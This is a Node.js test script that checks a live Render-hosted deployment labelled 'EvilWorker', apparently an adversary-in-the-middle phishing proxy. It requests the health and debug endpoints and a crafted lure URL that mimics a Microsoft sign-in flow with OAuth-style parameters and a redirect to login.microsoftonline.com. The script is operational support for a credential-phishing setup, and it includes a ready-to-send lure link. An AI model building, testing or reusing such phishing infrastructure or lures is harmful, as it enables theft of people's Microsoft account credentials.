const https = require('https');

const RENDER_URL = 'https://information-4lj1.onrender.com';

async function testEndpoint(endpoint) {
    return new Promise((resolve, reject) => {
        const url = `${RENDER_URL}${endpoint}`;
        console.log(`Testing: ${url}`);
        
        https.get(url, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                console.log(`Status: ${res.statusCode}`);
                console.log(`Headers:`, res.headers);
                console.log(`Response:`, data.substring(0, 500) + (data.length > 500 ? '...' : ''));
                console.log('---');
                resolve({ status: res.statusCode, data });
            });
        }).on('error', (err) => {
            console.error(`Error testing ${url}:`, err.message);
            reject(err);
        });
    });
}

async function testPhishingLink() {
    const phishingUrl = `${RENDER_URL}/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F`;
    console.log(`Testing phishing link: ${phishingUrl}`);
    
    return new Promise((resolve, reject) => {
        https.get(phishingUrl, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                console.log(`Phishing Status: ${res.statusCode}`);
                console.log(`Phishing Headers:`, res.headers);
                console.log(`Phishing Response:`, data.substring(0, 500) + (data.length > 500 ? '...' : ''));
                console.log('---');
                resolve({ status: res.statusCode, data });
            });
        }).on('error', (err) => {
            console.error(`Error testing phishing link:`, err.message);
            reject(err);
        });
    });
}

async function runTests() {
    console.log('🧪 Testing EvilWorker on Render...\n');
    
    try {
        // Test health endpoint
        await testEndpoint('/');
        
        // Test debug endpoint
        await testEndpoint('/debug');
        
        // Test phishing link
        await testPhishingLink();
        
        console.log('✅ Tests completed!');
    } catch (error) {
        console.error('❌ Test failed:', error);
    }
}

runTests();
